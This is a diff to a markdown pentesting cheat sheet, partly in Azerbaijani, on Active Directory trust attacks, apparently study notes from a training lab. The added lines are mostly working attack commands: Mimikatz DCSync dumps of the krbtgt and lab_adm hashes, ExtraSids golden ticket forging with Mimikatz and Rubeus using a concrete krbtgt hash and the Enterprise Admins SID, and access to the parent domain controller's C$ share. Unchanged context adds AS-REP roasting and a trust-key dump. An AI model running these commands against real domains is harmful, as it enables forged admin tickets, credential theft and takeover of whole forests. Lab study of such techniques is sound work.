@@ -44,11 +44,36 @@ SharpHound: Məlumatları yığmaq üçün SharpHound.exe -c All işlədin.
 Sorgu: BloodHound interfeysində "Map Domain Trusts" hazır sorğusunu seçin.
 ```
 
-### Trust Exploitation
+### SID History Primer
 ```
-# SID History Abuse (Golden Ticket)
-# Child Domain krbtgt hash-i, Child SID və Parent Domain-in Enterprise Admins qrupunun SID-i lazımdır
-kerberos::golden /user:Administrator /domain:child.local /sid:S-1-5-21-CHILD-SID /krbtgt:HASH /sids:S-1-5-21-PARENT-SID-519 /ticket:gold.kirbi
+# Mimikatz
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+Get-DomainSID
+Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+
+klist
+ls \\academy-ea-dc01.inlanefreight.local\c$
+
+# Rubeus
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+klist
+
+# DCSync
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+
+
+
+
+
+
+
+
+
 
 # Cross-Trust AS-REP Roasting
 # GetNPUsers ilə digər domendəki istifadəçiləri hədəf alırıq
@@ -58,4 +83,10 @@ python3 GetNPUsers.py otherdomain.local/ -usersfile users.txt -dc-ip 10.129.16.5
 # Mimikatz vasitəsilə
 lsadump::trust /patch
 ```
+
+### ExtraSids Attack
+```
+
+```
+
 
